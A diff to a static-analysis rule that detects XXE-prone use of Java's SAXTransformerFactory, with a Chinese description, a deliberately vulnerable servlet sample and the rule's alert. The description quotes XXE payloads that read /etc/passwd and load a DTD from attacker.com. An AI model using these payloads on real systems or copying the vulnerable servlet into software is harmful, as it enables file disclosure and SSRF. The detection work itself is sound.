@@ -9,7 +9,7 @@ desc(
 XXE（XML External Entity）即XML外部实体注入漏洞，发生在应用程序解析XML输入时，由于没有禁止外部实体的加载，攻击者可以构造恶意XML，引用外部实体，从而导致读取任意文件，进行SSRF攻击，甚至在特定条件下执行系统命令。`SAXTransformerFactory`在默认配置下允许加载外部实体，如果应用程序使用此工厂处理来自不可信源的XML数据，就可能引入XXE风险。
 
 2. **触发场景**
-当应用程序接收外部XML输入（如用户上传的XML文件、请求体中的XML数据）并使用`SAXTransformerFactory.newInstance()`创建的工厂来解析或转换这些XML时，如果未禁用外部实体的加载，攻击者可以通过构造含有恶意外部实体引用的XML来触发漏洞。例如，XML中包含 `< !DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` 或 `< !DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>` 这样的定义，应用程序解析时会尝试读取文件或访问URL。
+当应用程序接收外部XML输入（如用户上传的XML文件、请求体中的XML数据）并使用`SAXTransformerFactory.newInstance()`创建的工厂来解析或转换这些XML时，如果未禁用外部实体的加载，攻击者可以通过构造含有恶意外部实体引用的XML来触发漏洞。例如，XML中包含 `<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` 或 `<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>` 这样的定义，应用程序解析时会尝试读取文件或访问URL。
 
 ```java
 package com.example.sax;
@@ -34,11 +34,9 @@ public class SAXTransformerFactoryServlet extends HttpServlet {
             TransformerHandler transformerHandler = sf.newTransformerHandler(source);
             Result result = new StreamResult(resp.getWriter());
             transformerHandler.setResult(result);
-        
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
-
     }
 }
 ```
@@ -90,7 +88,7 @@ public class SAXTransformerFactoryServlet extends HttpServlet {
             TransformerHandler transformerHandler = sf.newTransformerHandler(source);
             Result result = new StreamResult(resp.getWriter());
             transformerHandler.setResult(result);
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -112,12 +110,6 @@ SAXTransformerFactory.newInstance() as $ins;
 $ins?{!.setAttribute}.newTransformerHandler().setResult() as $vuln;
 check $vuln;
 alert $vuln for {
-	solution: <<<CODE
-
-CODE
-	desc: <<<CODE
-
-CODE
 	level: "warning",
 	message: "SAXTransformerFactory Unsafe Use in Context Sink",
 	title: "Check Java SAXTransformerFactory Unsafe Use (XXE)",
